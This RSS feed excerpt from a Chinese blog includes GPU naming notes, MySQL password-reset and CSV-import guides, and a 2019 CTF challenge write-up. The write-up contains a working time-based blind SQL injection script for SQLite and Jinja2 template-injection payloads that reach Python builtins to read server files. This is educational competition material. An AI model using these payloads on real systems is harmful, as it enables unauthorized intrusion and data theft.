&lt;p>NVLink 是 Nvidia 开发的一种总线及通信协议。常用的用法是可以实现多个显卡之间互相连接，可以实现多卡一同协同工作的效果。NVLink 需要其官方生产的桥接器，以及显卡上有对应的 NVLink 接口才可以使用，同时也不是所有 NVIDIA 显卡支持 NVLink。具体产品建议上 NVIDIA 官网查询其产品参数，找到是否支持 NVLINK 选项。
&lt;img src="./images6.png" alt="">
&lt;img src="./images7.png" alt="">
&lt;img src="./images8.png" alt="">
从上图中我们也可以看到具体的桥接器选择也和双显卡之间的 PCIE 插槽间距有关。当然，插槽间距取决于设备所采用的主板。&lt;/p>
&lt;h4 id="rtx光追">RTX/光追&lt;/h4>
&lt;p>光追，又叫光线追踪技术，是英伟达开发的用于提升视频实时渲染光线的技术。这里做一些简单的解释：&lt;/p>
&lt;p>在常见的游戏中，我们所看到的各种光线效果其实是基于贴图预先设计好的效果，例如玻璃镜面的反射等等，这些光线效果并不能根据场景变化实时变化，这与现实世界并不符。当然现在可以利用强大的计算机算力去实时计算光线效果，但是这样非常耗费计算机资源，在游戏中是不可能实现的。&lt;/p>
&lt;p>于是英伟达开发了实时光线追踪技术，并将其集成到自家的显卡中，&lt;strong>并将带有实时光线追踪计算能力的一系列产品称之为 RTX 系列&lt;/strong>。有了实时光线追踪技术，我们理论上可以在游戏中实现人物是随意在路边任何一个小水塘，亦或是其他什么光滑镜面上看到人物的反射影像（以往的游戏工业中镜中人像是需要特殊处理的，常规场景中镜面只有贴图并不会有实时的人物映像）&lt;/p>
&lt;h4 id="矿卡">矿卡&lt;/h4>
&lt;p>指在虚拟货币，以及使用显卡计算挖掘虚拟货币诞生后挖掘过虚拟货币的二手显卡（我们把显卡计算虚拟货币的过程称作挖矿）。换而言之，即挖过矿的显卡。这类显卡多数为二手显卡（亦或是三手甚至四手）。因为“挖矿”需要显卡 24hx7 不间断满负荷运行，因而对电子元器件的损伤较大，所以这类二手显卡的寿命有很大程度的不确定性。同时由于多数二手奸商会采取将矿卡回收后翻修，清洗后冒充普通二手卡（即普通家用卡），甚至全新卡售卖的情况，因而正常消费者对“矿卡”这一名词怨念很大。&lt;/p>
&lt;p>不过在前不久主流虚拟货币已经取消了显卡挖矿，即显卡挖矿的收益变得很低，多数投机客无法在用显卡从事这类工作。所以挖过矿的显卡型号主要集中在 10 系列-30 系列，全新的 40 系列以及 30 系列旗舰 3090ti 基本不存在矿卡。&lt;/p>
&lt;p>&lt;strong>AMD 显卡也可以挖矿&lt;/strong>&lt;/p>
&lt;h4 id="显卡拓展坞">显卡拓展坞&lt;/h4>
&lt;p>显卡拓展坞是为了弥补笔记本电脑自带显卡性能羸弱而发明的产品。通过 typec 接口走&lt;a href="https://baike.baidu.com/item/%E9%9B%B7%E7%94%B5%E6%8E%A5%E5%8F%A3/10523008">雷电协议&lt;/a>（目前为雷电 3 或者雷电 4）将原本用于台式机设备的显卡提供给笔记本电脑使用，从而弥补笔记本显卡处理能力弱的问题。当然桌面级别下显卡供电是依靠的扩展坞的额外电源。&lt;/p>
&lt;p>不过显卡拓展坞受限于雷电协议的传输速率问题，使用拓展坞外接显卡必定会带来性能损失。通常而言外接显卡的性能越高，这个相应的损失也就越大，一般在 5%-20%之间。&lt;/p>
&lt;h4 id="显卡-pcie-协议">显卡 PCIE 协议&lt;/h4>
&lt;p>之前系列讲解到显卡通过 PCI-E 插槽和主板相连接，这个插槽所使用的协议也就是 pcie 协议。pcie 协议也有版本区分，目前市面上常见的显卡都支持 pcie3 协议，新款支持 pcie4 协议。以及目前协议版本最新是 pcie5 不过并没有显卡支持。同时 pcie4 向下兼容 pcie3。同时协议需要显卡本身和主板同时支持才可以开启。&lt;/p>
&lt;h3 id="英伟达显卡命名规则">英伟达显卡命名规则&lt;/h3>
&lt;p>英伟达 Nvidia 显卡，&lt;strong>俗称 N 卡&lt;/strong>，显卡的命名规则同样分为消费级和企业级，同时由于显卡的发展历史相当久远，这里不会讨论所有产品型号。只讲解常见的中高端产品。&lt;/p>
&lt;p>以“NVIDIA Geforce GTX 1080TI”为例&lt;/p>
&lt;ul>
&lt;li>
&lt;p>NVIDIA 即英伟达&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Geforce 显卡系列&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>系列&lt;/th>
&lt;th>作用&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>GeForce&lt;/td>
&lt;td>常见的消费级产品，用于个人用户游戏或者是视频剪辑等&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Quadro&lt;/td>
&lt;td>用于专业绘图设计，面向企业级用户例如电影工作室等&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>TITAN&lt;/td>
&lt;td>泰坦系列，多数为 GeForce 系列的最顶级版本，亦可归类为消费级&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Tesla&lt;/td>
&lt;td>用于大规模并联电脑运算，代表应用场景数据中心，云计算&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>
&lt;p>GTX 代表显卡定位&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>英文&lt;/th>
&lt;th>定位&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>GTX&lt;/td>
&lt;td>旧高端版本，10 系列以前不带光追的高端显卡&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>RTX&lt;/td>
&lt;td>新高端代表，具有光追功能的显卡&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GTS&lt;/td>
&lt;td>中端产品&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GT&lt;/td>
&lt;td>低端产品&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>
&lt;p>10 代表这是 10 系列显卡，有 1-10 系列，自 10 系列后命名改为以 10 递增，即 20 系列，30 系列以及目前最新的 40 系列。&lt;strong>值得注意的是在 10 系列和 20 系列中还有一个 16 系列&lt;/strong>。该系列是在英伟达推出 20 系列光追显卡后为了填补无光追显卡的市场推出的系列，代表产品 1650,1660,1660TI 等。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>80 则代指该系列中的型号，一般常见有 50,60,70,80,90（90 仅出现在 10 系列显卡之后的系列中）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>单词后缀则表示特殊版本，常见后缀如下。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>后缀&lt;/th>
&lt;th>含义&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>无后缀&lt;/td>
&lt;td>标准版本，例如 1060&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>TI&lt;/td>
&lt;td>相较于无后缀版本增强版，例如 1080ti&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Super&lt;/td>
&lt;td>小幅度强于无后缀版本，例如 2060 super&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SE&lt;/td>
&lt;td>代表削弱版本&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>M&lt;/td>
&lt;td>代表移动端版本，面向笔记本电脑的产品&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>MX&lt;/td>
&lt;td>相较于 M 版本有增强&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Max-Q&lt;/td>
&lt;td>针对笔记本产品优化的低功耗高性能版本（但是还是会弱于桌面级别产品），多出现在游戏本显卡例如 1070 Max-Q&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;p>除开上述这些标准命名规则外，还有一些来自民间的简化版本。显卡具有显存，有时候同一型号的显卡可能有具有不同大小显存的两个版本，于是会将显存大小附在显卡型号末尾来做区分。例如“Geforce gtx 1060 6g 显存版本”，会简称为“1066”，其还有一个 3g 显存版本会称为“1063”。当然当显存超过 2 位数似乎就不存在这种化简了，一般直接附在末尾，例如 3080 8g 版本（3088）和 3080 12g 版本。&lt;/p>
&lt;p>以上标准多数应用在消费级产品，企业级产品的命名较为模糊，具体以官网信息为准。更多型号名称及性能差异参见&lt;a href="https://www.mydrivers.com/zhuanti/tianti/gpu/index.html">显卡天梯图&lt;/a>&lt;/p>
&lt;h4 id="英伟达-gpu-芯片微架构">英伟达 GPU 芯片微架构&lt;/h4>
&lt;p>显卡核心同样具有架构，NVIDIA 芯片架构多喜欢使用科学家的名字命名，以下基于时间线梳理。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名词&lt;/th>
&lt;th>产品面向&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Tesla 特斯拉&lt;/td>
&lt;td>远古时代架构，例如型号 G80(英伟达还有个产品系列 Tesla,专门面向云计算数据中心领域，这两个 Tesla 不是一个概念。)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Fermi 费米&lt;/td>
&lt;td>Tesla 架构后的系列，用于 GeForce 400 系列，500 系列以及部分 800 系列&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Kepler 开普勒&lt;/td>
&lt;td>Fermi 架构的后续系列，用于 GeForce 600 系列，700 系列，及部分 800 系列&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Maxwell 麦斯威尔&lt;/td>
&lt;td>与 Kepler 架构一起用于 GeForce 700 系列，800 系列&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Pascal 帕斯卡&lt;/td>
&lt;td>应用于 Teesla P100 显卡以及 Geforce 10 系列显卡，1050,1050ti,1060 等&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Volta 伏特&lt;/td>
&lt;td>多数面向专业显卡计算卡领域 例如 Tesla V100,Quadro 系列，以及消费级产品 Titan V&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Turing 图灵&lt;/td>
&lt;td>主要产品 GeForce 16 系列， GeForce 20 系列，Quadro RTX 系列，以及 Tesla T4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Ampere 安培&lt;/td>
&lt;td>主要用于 GeForce 30 系列产品&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Hopper 霍普&lt;/td>
&lt;td>专业领域&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Ada 爱达 勒芙蕾丝&lt;/td>
&lt;td>消费级&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;strong>以上架构信息仅截止发文时刻，仅包含部分产品，更详细的架构信息确认请前往官网查看，&lt;/strong>&lt;/p>
&lt;h4 id="tensor-corecuda-corert-core">Tensor core/CUDA core/RT core&lt;/h4>
&lt;p>张量核心，库打核心(音译)，光线追踪核心&lt;/p>
&lt;ul>
&lt;li>Tensor core 是为执行张量计算以及矩阵运算专门设计的核心（以上二者为数学上的概念），Tensor core 的数量对加速深度学习等具有较高的效率。&lt;/li>
&lt;li>CUDA core 标准的英伟达显卡核心，负责多数常规运算。&lt;/li>
&lt;li>RT core，光线追踪核心，这一核心数量直接关系显卡光线追踪性能&lt;/li>
&lt;/ul>
&lt;p>这三者的核心数量和核心架构，显存，显存位宽等共同决定显卡性能。&lt;/p>
&lt;h3 id="amd-显卡命名规则">AMD 显卡命名规则&lt;/h3>
&lt;p>AMD（&lt;del>按摩店&lt;/del>）显卡，以“AMD RX6800XT”为例&lt;/p>
&lt;ul>
&lt;li>AMD 代表厂家&lt;/li>
&lt;li>RX 显卡级别，R3,R5,R7,R9,RX 分别代表从低端到高端&lt;/li>
&lt;li>6 代表第六代&lt;/li>
&lt;li>800 代表性能级别，一般越大性能越高，比如顶级 6950&lt;/li>
&lt;li>XT 代表增强版本，除了 XT 外还有 XTX,比 XT 更强。&lt;/li>
&lt;/ul>
&lt;p>amd 在 5000 系列显卡之前，显卡一直是 400,500 系列的三位数型号。同时在 500 系列之后有一个 Vega 系列，随后是 5000 系列，6000 系列以及最新的 7000 系列。更多型号名称及性能差异参见&lt;a href="https://www.mydrivers.com/zhuanti/tianti/gpu/index.html">显卡天梯图&lt;/a>&lt;/p>
&lt;h4 id="amd-显卡架">AMD 显卡架&lt;/h4>
&lt;p>AMD 显卡的架构较为简单，目前分为 RDNA 1，2，3 代&lt;/p>
&lt;h2 id="计算机存储单位计算">计算机存储单位计算&lt;/h2>
&lt;p>在之后的计算机硬盘，内存等相关的内容中，容量相关概念将会被提及的非常频繁。因此有必要在开始接下来的内容前详尽的科普一下有关计算机存储容量的相关知识点。由于该篇章内容较为重要，因此将会采用独立的文章来讲述此篇幅内容。&lt;/p>
&lt;ul>
&lt;li>
&lt;h3 id="计算机存储单位详解hahahugoshortcode23s0hbhb">&lt;a href="https://yuukisama.cc/posts/code/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E8%AF%A6%E8%A7%A3/">计算机存储单位详解&lt;/a>&lt;/h3>
&lt;/li>
&lt;/ul></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/%E7%A1%AC%E4%BB%B6%E7%9F%A5%E8%AF%86/">硬件知识</category></item><item><title>2019信安国赛出题经历</title><link>https://yuukisama.cc/posts/code/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/</guid><pubDate>Wed, 05 Jun 2019 15:22:45 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;ul>
&lt;li>无力吐槽的信安国赛，段子乎喷了上届比赛有多坑，感觉这届也不差啊？&lt;/li>
&lt;li>算了，我知道是我太菜。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;ul>
&lt;li>本博客记录了一篇2019信安国赛复赛本队出题的一些经历。包括题目思路，搭建方法，以及writeup。&lt;/li>
&lt;li>尽管我们没有最后参加复赛，但是也发现出题是一个很好的锻炼方式。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="1.jpeg" alt="">&lt;/p>
&lt;h2 id="more">MORE&lt;/h2>
&lt;ul>
&lt;li>题目名称：不仅仅是个SQL&lt;/li>
&lt;li>出题人：CC from nothing&lt;/li>
&lt;/ul>
&lt;h3 id="points">POINTS&lt;/h3>
&lt;ol>
&lt;li>基于SQLITE数据库的盲注&lt;/li>
&lt;li>基于jinja2模板注入漏洞的任意代码执行漏洞&lt;/li>
&lt;/ol>
&lt;h3 id="writeup">WRITEUP&lt;/h3>
&lt;p>&lt;img src="2.jpg" alt="">&lt;/p>
&lt;ul>
&lt;li>打开网站首先看到的是一个登陆界面&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="1.jpg" alt="">&lt;/p>
&lt;ul>
&lt;li>照例查看一下网站的robots.txt看一下有没有什么可以发现的。&lt;/li>
&lt;li>robots.txt中是网站登陆认证逻辑的源码，可以看出后算是使用python编写，数据库为sqlite。并对用户输入进行了过滤。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="2.jpg" alt="">&lt;/p>
&lt;ul>
&lt;li>输入常用payload发现没有任何回显，所以这里需要盲注&lt;/li>
&lt;li>sqlite3数据库的盲注是采用randomblob()函数
randomblob()函数生成指定长度的随机字符串。当这个长度足够大的时候就会让服务器产生明显的延迟。这样就可以判断语句的执行成功与否。&lt;/li>
&lt;li>经过多次尝试发现后端过滤了小写的select，from等关键词。于是采用如图所示的方式注入&lt;/li>
&lt;li>我们编写了如下脚本来注入获取密码&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>def sqlpw(url):
session=requests.Session()
params={&amp;#34;password&amp;#34;:&amp;#34;0&amp;#34;}
password=&amp;#34;&amp;#34;
for i in range(32):
for x in &amp;#34;0123456789abcdefghijklmnopqrstuvwsyz&amp;#34;:
try:
username=&amp;#34;admin&amp;#39;AND(SELECT(hex(substr(password,{},1)))FROM(users))=hex(&amp;#39;{}&amp;#39;)AND(randomblob(1000000000))--&amp;#34;.format(i+1,x)
params[&amp;#39;username&amp;#39;]=username
# print(params)
r=session.post(url,data=params,timeout=1)
# print(r.status_code)
except exceptions.Timeout:
password=password+x
logging.info(password)
sleep(3)
break
return password
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>运行脚本之后我们就获取到了密码的md5值，利用网上很多的md5查询库便可以得到密码原文&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="3.jpg" alt="">&lt;/p>
&lt;ul>
&lt;li>使用用户名密码登陆成功之后出现如上的欢迎界面。检查网页源码发现flag位于根目录下&lt;/li>
&lt;li>这里的鸟居图片既是另一个提示。jinja2项目的LOGO
&lt;img src="4.png" alt="">&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="4.jpg" alt="">&lt;/p>
&lt;ul>
&lt;li>从URL传入参数username入手写入测试payload验证漏洞存在&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="5.jpg" alt="">&lt;/p>
&lt;ul>
&lt;li>经过测试发现注入点过滤方括号，于是构成如图所示payload完成注入获得flag&lt;/li>
&lt;/ul>
&lt;h2 id="jinja2模板注入漏洞">Jinja2模板注入漏洞&lt;/h2>
&lt;ul>
&lt;li>Jinja2漏洞最早出现在py2的版本上。&lt;/li>
&lt;li>漏洞原理基本就是传入的url中如果包含python脚本也是会被模板解析的。因为模板能够访问python内置变量以及变量方法。&lt;/li>
&lt;li>注意python2和python3存在差别在类层结构上存在差别&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>__class__ 返回调用参数类型
__base__ 返回基类
__mro__ 允许我们在当前Python环境下追溯继承树
__subclasses__() 返回子类
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>
&lt;p>获取基类&lt;/p>
&lt;p>首先通过str，dict，tuple，list等类型来获取python的基本类（因为python万物皆对象）你也可以通过一些其它jinja2已经导入的包来获取基类&lt;/p>
&lt;pre tabindex="0">&lt;code>python3:
&amp;#39;&amp;#39;.__class__.__base__
[].__class__.__base__
requests.__class__.__base__
python2:
&amp;#39;&amp;#39;.__class__.__mro__[2]
[].__class__.__base__
requets.__class__.__mro__[8]
&lt;/code>&lt;/pre>&lt;p>获取基类的方法可以在python命令行中输入尝试&lt;/p>
&lt;p>&lt;strong>如果题目对中括号做了限制，也可以通过__getitem__(2)函数绕过限制&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>读取文件&lt;/p>
&lt;p>&lt;strong>以下基类通过object代替&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>python2：
object.__subclasses__()[40](&amp;#39;/etc/password
&amp;#39;).read()
//获取file类读文件
&lt;/code>&lt;/pre>&lt;p>python3中要复杂的多，首先是python3的类层结构和python2下相比会复杂的多。其次python3的类必须经过初始化等等操作才可以使用其内建函数&lt;/p>
&lt;pre tabindex="0">&lt;code>python3:
object.__subclasses__()[78].__init__.__globals__.__builtins__.open(&amp;#34;./flag.txt&amp;#34;,encoding=&amp;#34;utf-8&amp;#34;).read()
&lt;/code>&lt;/pre>&lt;p>python3中我们获取子类列表之后随便选择一个类，查看其__init__&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;slot wrapper &amp;#39;__init__&amp;#39; of &amp;#39;object&amp;#39; objects&amp;gt;
&lt;/code>&lt;/pre>&lt;p>wrapper是指这些函数没有被重载。这是他们并不是function，并不具有___globals__属性。我们在多尝试几个子类就可以找到一个被__init__的类，比如。接下来就可以使用内置函数执行命令。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>以上都只是最基础的操作，jinja2模板注入还有很多其他操作需要更多的尝试理解才可以完成。&lt;/p>
&lt;h2 id="后记">后记&lt;/h2>
&lt;ul>
&lt;li>这次比赛真是一个很不愉快的体验。这个题目出题到写博客也隔了很久。所以有些细节在本博客中可能描述的很不清楚。（总之这篇博客很垃圾就是了）在图书馆办公室一边修理爬虫一边跑着爬虫利用闲暇之余写出来的博客真的质量不高令人堪忧。总之就这样吧，感谢阅读。&lt;/li>
&lt;/ul></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/python/">Python</category><category domain="https://yuukisama.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</category></item><item><title>MYSQL密码重置详解</title><link>https://yuukisama.cc/posts/code/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/</guid><pubDate>Wed, 29 May 2019 11:04:15 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>很多同学在学习数据库操作的过程中，总会因为某些莫名奇妙的原因导致数据库密码变动，而到了不得不重置数据库密码的情况。本文主要讲解一下各个版本的MYSQL数据库重置密码的方法。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="1.jpg" alt="">&lt;/p>
&lt;h2 id="如何查看mysql版本">如何查看MYSQL版本&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>打开一个命令行，在命令行里输入如下指令（如果你的MYSQL配置了环境变量的话）&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql --version
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>如果你的MYSQL没有配置环境变量，你可以去到mysql的安装目录下的bin文件夹里，运行上述命令。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你不知道如何改变命令行目录，可以用打开文件管理器，进入到mysql的安装目录下的bin文件夹内然后按住shift再点击鼠标右键。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>这时你可以看到右键菜单里有个“在此处打开powershell窗口”（或者也可能时在此处打开cmd窗口一类的）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你连这些都不会，如果你不知道什么是环境变量。emmmmmm这个教程大概不适合你.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>以上均基于Microsoft Windows 10系统&lt;/strong>&lt;/p>
&lt;h2 id="mysql-55">MYSQL 5.5+&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先开启一个具有管理员权限的命令行，在其中输入如下指令关闭mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net stop mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>接下来进入到mysql的安装文件夹下的bin目录内（如果你配置了环境变量也可以直接在命令行里运行）&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld -nt --skip-grant-tables
&lt;/code>&lt;/pre>&lt;p>如果你发现命令行运行的“卡住了”，那么恭喜你可以成功进入下一步&lt;/p>
&lt;p>--skip-grant-tables
你可以简单的理解为跳过密码认证&lt;/p>
&lt;/li>
&lt;li>
&lt;p>接下来保证这个命令行界面开启状态，重新打开一个新的命令行窗口。运行如下命令&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql -u root -p
&lt;/code>&lt;/pre>&lt;p>出现提示输入密码直接按回车即可，你会发现你已经成功给进入到了数据库内部&lt;/p>
&lt;/li>
&lt;li>
&lt;p>然后使用数据库命令重置密码即可&lt;/p>
&lt;pre tabindex="0">&lt;code>use mysql; -- 切换到mysql数据库
update user set password=password(&amp;#34;123456&amp;#34;) where user=&amp;#34;root&amp;#34;; --修改密码为123456
&lt;/code>&lt;/pre>&lt;p>以上命令也可以用于你知道密码的情况下想要修改密码。
不过在正常情况下执行完上述命令之后需要再增加如下命令刷新权限才可以让数据库密码更新成功（当然这里不需要）&lt;/p>
&lt;pre tabindex="0">&lt;code>flush privileges;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>当修改命令执行成功后。输入exit退出数据库。关闭这个新的命令行，回到我们一开始启动的命令行。使用ctrl+c中止命令。然后使用如下命令重启mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net start mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;p>如果不出意外，服务启动成功，那么你的密码重置就完成了。&lt;/p>
&lt;hr>
&lt;h2 id="mysql-80">MYSQL 8.0+&lt;/h2>
&lt;ul>
&lt;li>MYSQL 8下有两种方法可以重置密码&lt;/li>
&lt;/ul>
&lt;h3 id="使用--init-file">使用--init-file&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>首先依旧是打开一个具有管理员权限的命令行，使用命令停止mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net stop mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>接下来创建一个文本文件（sql.txt），指定在启动时需要执行的修改密码的命令。&lt;/p>
&lt;pre tabindex="0">&lt;code>ALTER USER &amp;#34;root&amp;#34;@&amp;#34;localhost&amp;#34; IDENTIFIED BY &amp;#34;123456&amp;#34;;
&lt;/code>&lt;/pre>&lt;p>将密码重置为123456&lt;/p>
&lt;/li>
&lt;li>
&lt;p>最后使用如下命令启动&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld --init-file=E:/sql.txt --console
&lt;/code>&lt;/pre>&lt;p>启动成功之后重新开启一个新的命令行，尝试使用重置的密码（123456）登陆数据库吧。如果没有重置成功，请检查sql.txt中的sql语句语法是否出现问题。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当你使用重置的密码登陆成功之后，关闭掉新的命令行界面，回到旧的命令行界面使用ctrl+c中止命令。最后再重新启动mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net start mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h3 id="使用--skip-grant-tables">使用--skip-grant-tables&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>开启一个具有管理员权限的命令行，先关闭mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net stop mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>使用如下命令无密码启动服务&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld --console --skip-grant-tables --shared-memory
&lt;/code>&lt;/pre>&lt;p>这就是mysql5与mysql8的差别，mysql8想要使用skip-grant启动必须加入额外参数，否则服务无法启动&lt;/p>
&lt;/li>
&lt;li>
&lt;p>接下来重新开启一个命令行以空密码登陆数据库&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql -u root -p
&lt;/code>&lt;/pre>&lt;p>提示输入密码直接按下回车即可。接下来重置密码&lt;/p>
&lt;pre tabindex="0">&lt;code>update mysql.user set authenication_string=&amp;#34;123456&amp;#34; where user=&amp;#34;root&amp;#34; and host=&amp;#34;localhost&amp;#34;;
&lt;/code>&lt;/pre>&lt;p>执行成功无错误之后即表示密码重置成功&lt;/p>
&lt;/li>
&lt;li>
&lt;p>接下来退出数据库，关闭新的命令行，回到之前的命令行使用ctrl+c中止命令，然后重新启动mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net start mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</category></item><item><title>MySQL导入csv文件数据</title><link>https://yuukisama.cc/posts/code/mysql%E5%AF%BC%E5%85%A5csv%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/mysql%E5%AF%BC%E5%85%A5csv%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE/</guid><pubDate>Wed, 15 May 2019 15:33:28 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>记录关于MySQL从csv文件导入数据的一些采坑记录&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="star.jpg" alt="">&lt;/p>
&lt;h2 id="什么是csv文件">什么是csv文件&lt;/h2>
&lt;ul>
&lt;li>csv文件本质只是一个文本文件，它与你所见过的txt文件别无差异。（对，除了excel，你还可以用txt打开这类文件）&lt;/li>
&lt;li>csv文件（Comma-Separated Values）逗号分隔值文件格式，其文件以&lt;strong>纯文本&lt;/strong>形式存储表格数据，并且以逗号分隔。&lt;/li>
&lt;/ul>
&lt;h2 id="怎样将数据从csv导入到mysql">怎样将数据从csv导入到mysql&lt;/h2>
&lt;ul>
&lt;li>
&lt;h3 id="如果你看到如下报错">如果你看到如下报错&lt;/h3>
&lt;pre tabindex="0">&lt;code>The MySQL server is running with the --secure-file-priv option so it cannot execute...
&lt;/code>&lt;/pre>&lt;p>首先部分Mysql server设置中不允许你从任意路径导入数据&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>解决这点，你只需要在mysql server的&lt;strong>安装路径&lt;/strong>下修改my.ini文件，并在其中修改如下内容（划重点，安装路径！！！安装路径里必定存在bin这类似文件夹）如果你有这个文件就找到对应的地方修改，如果没有就添加（注意开头不要有井号）&lt;/p>
&lt;p>&lt;strong>修改文件最好备份my.ini因为如果这个文件内容错误mysql将无法启动&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>[mysqld]
secure-file-priv=&amp;#34;D:/CoderLife/testMySQL&amp;#34;
# 这个路径你自己可以自定义
